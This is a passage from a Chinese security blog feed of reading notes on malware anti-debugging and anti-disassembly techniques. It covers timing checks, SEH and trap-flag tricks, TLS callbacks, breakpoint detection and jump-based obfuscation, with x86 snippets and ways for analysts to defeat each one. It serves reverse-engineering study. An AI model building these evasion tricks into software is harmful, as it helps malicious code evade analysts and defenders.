title="2-3：检测系统痕迹"></a>2-3：检测系统痕迹</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过扫描调试器在系统中残留的痕迹来判断进程是否处于调试状态。可以选择注册表HKLM\SOFTWARE\MICROSOTF\WINDOWS NT\CURRENTVERSION\AeDebug或者查看窗口是否存有调试器名称（FindWindow）或者使进程等方面来判断。</p><h1 id="3-TIME-CHECK（时钟检测）"><a href="#3-TIME-CHECK（时钟检测）" class="headerlink" title="3.TIME CHECK（时钟检测）"></a>3.TIME CHECK（时钟检测）</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逐行跟踪代码比正常运行代码所花费的时间多得多。通过比较计算运行代码之间的时间差来判断进程是否处于调试状态。一般的，利用windows提供的时间和CPU的计数器（TSC）来测量时间差。TSC基于cpu内部的计数器，所以计算精度会更高。利用以下伪代码实现<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Time1</span>=GetTime（）；</div><div class="line">RunCode（）；</div><div class="line"><span class="attribute">Time2</span>=GetTime（）；</div><div class="line"><span class="keyword">if</span>（Time2-Time2&gt;0xfffffffff)</div><div class="line">printf(<span class="string">"Debugged"</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">   printf(<span class="string">"No Debugged"</span>);</div></pre></td></tr></table></figure></p><h2 id="3-1：rdtsc指令"><a href="#3-1：rdtsc指令" class="headerlink" title="3-1：rdtsc指令"></a>3-1：rdtsc指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CPU中存在一个名为TSC(时间戳计数器)的64为寄存器。RDTSC是一个读取该寄存器的指令，得到的值高32位存储在EDX中，低32位保存在EAX中。<br>    <img src="https://i.imgur.com/3cLmQNY.png" alt=""></p><h2 id="3-2：利用GetTickCount或者QueryPerformanceCounter来判断"><a href="#3-2：利用GetTickCount或者QueryPerformanceCounter来判断" class="headerlink" title="3-2：利用GetTickCount或者QueryPerformanceCounter来判断"></a>3-2：利用GetTickCount或者QueryPerformanceCounter来判断</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用这两个函数方法和伪代码一样。if（Time2-Time2&gt;0xfffffffff)语句中0xfffffffff是一个处于0xffff到0xffffffff中的一个任意值，因为单步一个指令所用的时间必定大于0xffffffff</p><h1 id="4-干扰调试器"><a href="#4-干扰调试器" class="headerlink" title="4.干扰调试器"></a>4.干扰调试器</h1><h2 id="4-1：陷阱标志SEH反调试"><a href="#4-1：陷阱标志SEH反调试" class="headerlink" title="4-1：陷阱标志SEH反调试"></a>4-1：陷阱标志SEH反调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CPU第9个标志位TF为陷进标志位，当TF位1的时候，CPU进入单步模式，没执行一条指令，就会触发一个单步异常。如果进程处于调试状态，触发异常后，异常会交给调试器，此时不会执行SEH处理函数。如过程序处于非调试状态，则会触发SEH异常处理。如图，在401011处安装一个SEH处理函数，<strong>401024用于置陷进标志位，因为无法直接修改寄存器，先用栈保存寄存器数据，然后修改第8位比特数。</strong>利用nop触发单步异常，如果进程处于调试状态就会触发这个异常，进程转入40102F和401034，如果进程没有处于调试状态，就会转入异常处理函数，然后结束异常处理。【关于陷进标志，请看逆向工程核心原理第566页】<br>    <img src="https://i.imgur.com/OUcDnnS.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>解决方法：先忽略异常，在SEH处理函数和处理完毕后下断点，运行即可。</strong></p><h2 id="4-2：Int-3结合SEH反调试"><a href="#4-2：Int-3结合SEH反调试" class="headerlink" title="4-2：Int 3结合SEH反调试"></a>4-2：Int 3结合SEH反调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Int 3是软件中断，操作码是0xcc，一般反调试的手法都是结合SEH来进行的，如果进程处于调试状态，触发异常后，异常会交给调试器，此时不会执行SEH处理函数，一般这个地方都是设置一个趋于死亡的函数跳转如：mov eax，1；jmp eax。如果程序正常，则异常交给SEH处理函数，通过SEH处理函数，最后回归正常的代码。如图所示：<br>    <img src="https://i.imgur.com/K8Coqhi.png" alt=""></p><ul><li>在调试器选项中勾选忽略所有异常（这里是断点异常）</li><li>在SEH处理函数处（40102A）和结束异常处理后（401044）设置断点。</li><li>运行程序即可。（部分环境下使用单步会使得调试奔溃，建议使用F9运行）<h2 id="4-3：Int-2D"><a href="#4-3：Int-2D" class="headerlink" title="4-3：Int 2D"></a>4-3：Int 2D</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Int 2D是内核模式用于触发断点的指令，在用户模式也是可以执行的，但是调试器不会触发此异常，只是忽略，如果遇到Int 2D指令，调试器无法执行单步指令，知道遇到断点才能中断。如图遇到int 2d断点异常。<br>  <img src="https://i.imgur.com/h3a7ZIV.png" alt=""></li><li>使用隐藏OD插件吧，我调了很久还是过不了.<h2 id="4-4：TLS反调试"><a href="#4-4：TLS反调试" class="headerlink" title="4-4：TLS反调试"></a>4-4：TLS反调试</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用TLS（线程本地存储技术）可以让代码优先于程序制动的OEP入口点运行，根据恶意代码查杀实战的说法可以使得一些敏感代码处于TLS回调函数中优先执行，这样就不会被调试，我想采取更加积极主动的反调试措施，在TLS回调函数中直接插入反调试代码进行反调试（书上只是隐藏关键代码）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;解决方法：利用TLS技术，程序会产生TLS节区，如果存在这个节区就要怀疑程序使用了反调试，我们应该设置调试器，中断在system Break-Poit让od在tls回调函数之前暂停。<strong>关于TLS反调试技术请见浅谈TLS反调试技术。</strong><h1 id="5-调试器特征检测"><a href="#5-调试器特征检测" class="headerlink" title="5.调试器特征检测"></a>5.调试器特征检测</h1><h2 id="5-1：0xcc检测"><a href="#5-1：0xcc检测" class="headerlink" title="5-1：0xcc检测"></a>5-1：0xcc检测</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xCC是软件断点的机器码，od在下断点的时候是否0xCC来代替原指令，但是又偷梁换柱的显示的是原指令，这样起到了中断的效果。但是，单纯的检测0xCC指令是不对的，因为很多其他指令也是使用0xCC机器码（移位，立即数）。<h2 id="5-2：API检测"><a href="#5-2：API检测" class="headerlink" title="5-2：API检测"></a>5-2：API检测</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们如果要调试一个程序的局部功能，最简单的方法是对API函数下个断点，然后执行到返回（或者根据堆栈查看返回地址）所以这种API下断也成为恶意代码编写者设置反调试的重点区域。在机器码层面上，调试器如果对某个API下断，其首个机器码变成0xcc（但是没显示出来）通过检测API的首个机器码来判断程序是否被调试。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>解决方法：不对API函数的第一条指令下断点，或者使用硬件断点（0xcc属于软件断点）</strong><h2 id="5-3：求校验和"><a href="#5-3：求校验和" class="headerlink" title="5-3：求校验和"></a>5-3：求校验和</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;微小的更改都可以使得代码缓冲区校验和发生改变，通过比较原始校验和和新校验和的值来判断是否进行调试。<h1 id="6-利用调试器的漏洞"><a href="#6-利用调试器的漏洞" class="headerlink" title="6.利用调试器的漏洞"></a>6.利用调试器的漏洞</h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;od1.0版本存在两个PE结构处理的漏洞，所以可以凭此来反调试，但是在2.0已经修复了该漏洞。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-反调试技术：&quot;&gt;&lt;a href=&quot;#1-反调试技术：&quot; class=&quot;headerlink&quot; title=&quot;1.反调试技术：&quot;&gt;&lt;/a&gt;1.反调试技术：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;恶意代码编写者利用反调试技术来判断恶意代码是否被调试，以此来阻止调试器分析，或者使调试器失效。&lt;strong&gt;注意，也可以使用反调试来保护我们的加密代码，不一定是干扰或者破坏调试器，&lt;/strong&gt;&lt;br&gt;参考资料：&lt;br&gt;1.逆向工程核心原理&lt;br&gt;2.恶意代码分析实战&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>反汇编对抗技术[读书笔记]</title>
    <link href="http://yoursite.com/2018/02/17/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/17/对抗反汇编技术/</id>
    <published>2018-02-17T08:45:11.000Z</published>
    <updated>2018-02-18T10:54:55.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-什么是反汇编对抗技术"><a href="#1-什么是反汇编对抗技术" class="headerlink" title="1.什么是反汇编对抗技术"></a>1.什么是反汇编对抗技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>对抗反汇编技术就是在程序中使用一些特殊的代码或者数据，让反汇编工具产生不正确的程序代码列表，这种技术由恶意软件编写者手工构造。对抗反汇编的时候，编写者会创建一段代码序列，欺骗反汇编器，使得反汇编器生成与正常代码不同的代码。一般的对抗反汇编的技术利用的是反汇编器的自身反汇编的缺陷来实施的</strong><br><a id="more"></a></p><h1 id="2-反汇编的两种基本策略"><a href="#2-反汇编的两种基本策略" class="headerlink" title="2.反汇编的两种基本策略"></a>2.反汇编的两种基本策略</h1><h2 id="2-1-线性反汇编"><a href="#2-1-线性反汇编" class="headerlink" title="2-1.线性反汇编"></a>2-1.线性反汇编</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线性反汇编是遍历整个代码段，一次一条指令的线性汇编，这样造成一个很严重的漏洞—-不区分代码和数据。如下代码：在一个线性反汇编工具会反汇编0ff_401050处的数据【变成代码】。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">jmp</span> <span class="built_in">ds</span>:off_401050[<span class="built_in">eax</span>*<span class="number">4</span>]<span class="comment">; switch数组</span></div><div class="line"><span class="comment">;switch cases</span></div><div class="line"><span class="symbol">code_1:</span></div><div class="line"><span class="symbol">code_2:</span></div><div class="line">···</div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">esi</span></div><div class="line"><span class="keyword">retn</span></div><div class="line"><span class="comment">;---------------------------------</span></div><div class="line">off_401050：<span class="built_in">dd</span> offset loc_401020  </div><div class="line">            <span class="built_in">dd</span> offset loc_401027</div><div class="line">            <span class="built_in">dd</span> offset loc_40102e</div><div class="line"><span class="built_in">dd</span> offset loc_401035</div></pre></td></tr></table></figure></p><h2 id="2-2-递归下降策略"><a href="#2-2-递归下降策略" class="headerlink" title="2-2.递归下降策略"></a>2-2.递归下降策略</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用递归下降策略的反汇编器（IDA）反汇编时会检查每个指令，并且为这些指令创建一个需要反汇编的地址表。<strong>一般的使用这种策略的反汇编器在处理条件跳转的时候都会优先反汇编False的分支，</strong>有很多对抗反汇编的方法都是针对这种特性来指定的。如下第一段代码是对抗反汇编的代码，经过修改后的如代码2所示，这就利用了反汇编器优先反汇编false分支（68 65 6c 6c 6f 00处的数据）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">E8 06 00 00 00             call  near ptr loc_4011CA+1</div><div class="line">68 65 6c 6c 6f             push 6f6c6c65h   ;显然这是一个错误地址，68h是h的ASCII码，代表的机器码是push</div><div class="line">                           loc_4011CA:</div><div class="line">00 58 c3                   add [edx-3dh],bl</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">E8 06 00 00 00             call  near ptr loc_4011CB</div><div class="line">68 65 6c 6c 6f 00          db &quot;hello&quot;,00      ;数据</div><div class="line">                           loc_4011CB:</div><div class="line">58                         pop eax</div><div class="line">c3                         retn</div></pre></td></tr></table></figure><h1 id="3-基于条件跳转的对抗反汇编"><a href="#3-基于条件跳转的对抗反汇编" class="headerlink" title="3.基于条件跳转的对抗反汇编"></a>3.基于条件跳转的对抗反汇编</h1><h2 id="3-1-相同目标的跳转指令"><a href="#3-1-相同目标的跳转指令" class="headerlink" title="3-1.相同目标的跳转指令"></a>3-1.相同目标的跳转指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种反汇编技术是使用指向同一个地址的两个连续的条件跳转实现的。通常，恶意代码编写者会构造一个特殊的机器码(如E8，E9)插入的代码中来干扰反汇编。如code_1所示：这个是被处理好的反汇编列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">74 03                   jz   short near ptr loc_4011C5</div><div class="line">75 01                   jnz  short near ptr loc_4011C5</div><div class="line">;----------------------------------------------------</div><div class="line">                        db e8h    ;构造的数据E8H</div><div class="line">                        loc_4001c5</div><div class="line">58                      pop  </div><div class="line">c3                      retn</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">74 03                   jz   short near ptr loc_4011C5</div><div class="line">75 01                   jnz  short near ptr loc_4011C5</div><div class="line">                        loc_4001c4:</div><div class="line">E8 58 C3 90 90          call 90D0D521h         ;错误的地址</div></pre></td></tr></table></figure><h2 id="3-2：固定条件的跳转指令"><a href="#3-2：固定条件的跳转指令" class="headerlink" title="3-2：固定条件的跳转指令"></a>3-2：固定条件的跳转指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过构造确定条件的条件跳转（如 xor eax,eax jz xxxx）来实现对抗反汇编，因为反汇编器只会处理false分支，存在条件跳转，其不会判断跳转是否是必然的结果。如代码1所示是一个正常的代码清单，但是没有经过处理是是代码2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">33 c0                   xor eax,eax</div><div class="line">74 01                   jz  short near ptr loc_4011C5</div><div class="line">;----------------------------------------------------</div><div class="line">E9                        db e9h    ;构造的数据E9H</div><div class="line">                        loc_4001c5</div><div class="line">58                      pop  </div><div class="line">c3                      retn</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">33 c0                   xor eax,eax</div><div class="line">74 01                   jz  short near ptr loc_4011C4+1</div><div class="line">                        loc_4001c4:</div><div class="line">E9 58 C3 68 94          jmp 90D0D521h         ;错误的地址</div></pre></td></tr></table></figure><h2 id="3-3-无效的反汇编指令"><a href="#3-3-无效的反汇编指令" class="headerlink" title="3-3:无效的反汇编指令"></a>3-3:无效的反汇编指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同一个字节作为两个不同指令的子集出现的时候，我们应该适当的选取，把不用的字节nop掉。</p><h1 id="4-混淆控制流图"><a href="#4-混淆控制流图" class="headerlink" title="4.混淆控制流图"></a>4.混淆控制流图</h1><h2 id="4-1：函数指针问题"><a href="#4-1：函数指针问题" class="headerlink" title="4-1：函数指针问题"></a>4-1：函数指针问题</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用函数指针，可以减少反汇编器推导出有效的信息量。如code1所示：是在sub_4011d0中调用sub_4011c0，在4011d5处引用了指针，但是也只是在该处使用了交叉引用，但是没有在4011de和4011e9两个调用sub_4011c0函数的地方采取交叉引用。<strong>解决方法是对var_4进行重命名</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">1011c0   sub_4011c0</div><div class="line">4011c0   arg_0       =<span class="built_in">dword</span> pro <span class="number">8</span></div><div class="line">4011c0               <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">4011c1               <span class="keyword">mov</span> <span class="built_in">ebp</span> <span class="built_in">esp</span></div><div class="line">                     <span class="comment">;code_sub4011C0</span></div><div class="line">4011ca               sub_4011c0 endp</div><div class="line">4011d0   sub_4011d0</div><div class="line">4011d0               <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">4011d1               <span class="keyword">mov</span> <span class="built_in">ebp</span> <span class="built_in">esp</span></div><div class="line">4011d3               <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line">4011d5               <span class="keyword">mov</span> [<span class="built_in">ebp</span>+var_4],sub_4011c0</div><div class="line">4011dc               <span class="keyword">push</span> <span class="number">2Ah</span></div><div class="line">4011de               <span class="keyword">call</span> [<span class="built_in">ebp</span>+var_4]      </div><div class="line">4011E1               <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line">4011e4               <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line">4011e6               <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">4011e9               <span class="keyword">call</span> [<span class="built_in">ebp</span>+var_4]</div></pre></td></tr></table></figure></p><h2 id="4-1-滥用返回指针"><a href="#4-1-滥用返回指针" class="headerlink" title="4-1.滥用返回指针"></a>4-1.滥用返回指针</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在ret不以函数调用的方式放回时会出现一下代码清单。call $+5的目的是在400c5压入栈中，而[esp+4+var_4]其实就是esp栈顶。其数值是4011c5，加5，就是4011ca，在ret到4011c5处执行代码！<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">4011</span>c0   sub_4011c0</div><div class="line"><span class="number">4011</span>c0   var_4       =byte ptr <span class="number">-4</span></div><div class="line"><span class="number">4011</span>c0               call $+<span class="number">5</span></div><div class="line"><span class="number">4011</span>c5               add [esp+<span class="number">4</span>+var_4],<span class="number">5</span></div><div class="line"><span class="number">4011</span>c9               ret</div><div class="line"><span class="number">4011</span>c9               sub_4011c0 endp ;sp -analysis failed</div><div class="line"><span class="number">4011</span>ca               ;----------------------------------</div><div class="line"><span class="number">4011</span>ca               push ebp</div><div class="line"><span class="number">4011</span>cb               mov ebp esp</div><div class="line"><span class="number">4011</span>cd               ；CodeFun</div><div class="line"><span class="number">4011</span>d0               retn</div></pre></td></tr></table></figure></p><h2 id="4-3-滥用SEH处理函数。"><a href="#4-3-滥用SEH处理函数。" class="headerlink" title="4-3.滥用SEH处理函数。"></a>4-3.滥用SEH处理函数。</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是SEH不被编译器采用造成的，SEH不多介绍。我们使用以下代码把处理函数添加到SEH链表中。在code1中，401050开始设置异常处理函数，但是执行到401055时eax的值是401071，这一块是SEH的处理函数，不被seh反汇编！<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> ExceptionHandle</div><div class="line"><span class="keyword">push</span> <span class="built_in">fs</span>:[<span class="number">0</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span></div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">401050               mov eax,(loc_40106B+1)  ;设置异常处理函数</div><div class="line">401055               add eax,14h</div><div class="line">401058               push eax</div><div class="line">401059               push fs:[0]</div><div class="line">401060               mov fs:[0],esp</div><div class="line">401067               xor ecx,ecx              ;抛出异常</div><div class="line">401069               div ecx</div><div class="line">40106B               call sleep</div><div class="line">401070               retn</div><div class="line">401070               sub_401050endp sp-snalysis failed</div><div class="line">401070              ---------------------------------</div><div class="line">401071              data.......</div></pre></td></tr></table></figure><ul><li>如图，修补程序创建函数，得到一个函数，但是发现这个函数没有外部参考，且发现一个除0异常如图1，可以肯定得是这个函数肯定调用。（应为下个函数出现了SEH结构）<br>   <img src="https://i.imgur.com/RnWW2Mk.png" alt=""><br>   <img src="https://i.imgur.com/XcvuJkz.png" alt=""></li><li>在main函数出现这个!400000H和148ch异或运算结果（40148c）存在ebp+4中，ebp+4用来保存函数的返回地址，此地址被覆盖，根据缓冲区溢出的原理，我们可以知道这个很有可能只需恶意代码。<br>   <img src="https://i.imgur.com/yOxdcCD.png" alt=""><br>   <img src="https://i.imgur.com/QdkXKTZ.png" alt=""></li><li>如图是在设置SEH处理例程。Handle函数的地址是4014c0<br>  <img src="https://i.imgur.com/C6VEPh4.png" alt=""></li><li>处理4014c0，发现是一个下载运行器<br>  <img src="https://i.imgur.com/rHH6ovM.png" alt=""><h2 id="4-4-对抗栈帧分析"><a href="#4-4-对抗栈帧分析" class="headerlink" title="4-4.对抗栈帧分析"></a>4-4.对抗栈帧分析</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ida试图分析一个函数来确定其栈帧结构，特别是遇到ret/retn就认为到达一个函数结尾，因此很容易伪造栈帧来阻止静态分析。给之前的代码加上一个ret 0xff//////<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;就是在函数中改变esp的值：比如说这里的”cmp esp,0x1000”,后面的”add esp , 0x104h”是永远不会执行的，在这里可以改变esp,也可以做其他的很多混淆手段。如以下代码，cmp esp，1000h恒大于1000h，所以，不会执行add esp，104h，关于堆栈可以用的数据就是sub esp,8；sub esp,4；和add esp,4，所以会分配8个字节栈空间，共计2个参数（int）。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="number">401543</span>             sub_401543 pronear </div><div class="line"><span class="number">401543</span>             arg_F4  = <span class="number">0F8H</span></div><div class="line"><span class="number">401543</span>             arg_F8  = <span class="number">0fch</span></div><div class="line"><span class="number">401543</span>             <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">8</span></div><div class="line"><span class="number">401546</span>             <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line"><span class="number">401549</span>             <span class="keyword">cmp</span> <span class="built_in">esp</span>,<span class="number">1000h</span>    <span class="comment">;esp与1000h比较，1000h处于内存最低页，不可能被栈使用</span></div><div class="line">40154f             <span class="keyword">jl</span> short loc_401556   ；小于跳转</div><div class="line"><span class="number">401551</span>             <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line"><span class="number">401554</span>             <span class="keyword">jmp</span> short loc_40155c</div><div class="line"><span class="number">401556</span>    <span class="comment">;-----------------------------</span></div><div class="line"><span class="number">401556</span>    loc_401556:</div><div class="line"><span class="number">401556</span>             <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">104h</span></div><div class="line">40155c    <span class="comment">;-----------------------------</span></div><div class="line">40155c    loc_40155c:</div><div class="line">40155c             <span class="keyword">mov</span> [<span class="built_in">esp</span>-<span class="number">0f8h</span>+arg_F8],<span class="number">1E61h</span><span class="comment">; [esp-4]esp为负数，不符合逻辑，IDA 堆栈分析异常</span></div><div class="line">·······</div></pre></td></tr></table></figure></li></ul><h1 id="5-实战分析"><a href="#5-实战分析" class="headerlink" title="5.实战分析"></a>5.实战分析</h1><h2 id="5-1-例1："><a href="#5-1-例1：" class="headerlink" title="5-1.例1："></a>5-1.例1：</h2><ul><li>在IDA出现红色的警告，说明反汇编失败，这时候我们用D,或者C键来转化数据类型<br>  <img src="https://i.imgur.com/RVuyWwH.png" alt=""></li><li>然后编辑-修补程序-改变字节，改成90H，在C键可以转化为代码。</li><li>把所有的都修复完毕，发现不能F5，原因是不是一个函数，编辑–函数–创建函数，就行了<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">const</span> CHAR *v4; <span class="comment">// eax@16</span></div><div class="line">  FILE *File; <span class="comment">// ST24_4@22</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *lpBuffer; <span class="comment">// [sp+10h] [bp-102ACh]@20</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Filename; <span class="comment">// [sp+14h] [bp-102A8h]@20</span></div><div class="line">  HINTERNET hInternet; <span class="comment">// [sp+18h] [bp-102A4h]@16</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [sp+1Ch] [bp-102A0h]@1</span></div><div class="line">  <span class="keyword">char</span> v10; <span class="comment">// [sp+1Dh] [bp-1029Fh]@1</span></div><div class="line">  __int16 v11; <span class="comment">// [sp+10019h] [bp-2A3h]@1</span></div><div class="line">  <span class="keyword">char</span> v12; <span class="comment">// [sp+1001Bh] [bp-2A1h]@1</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+1001Ch] [bp-2A0h]@5</span></div><div class="line">  HINTERNET hFile; <span class="comment">// [sp+10020h] [bp-29Ch]@16</span></div><div class="line">  <span class="keyword">char</span> *Str; <span class="comment">// [sp+10024h] [bp-298h]@19</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> <span class="title">WSAData</span>;</span> <span class="comment">// [sp+10028h] [bp-294h]@1</span></div><div class="line"> 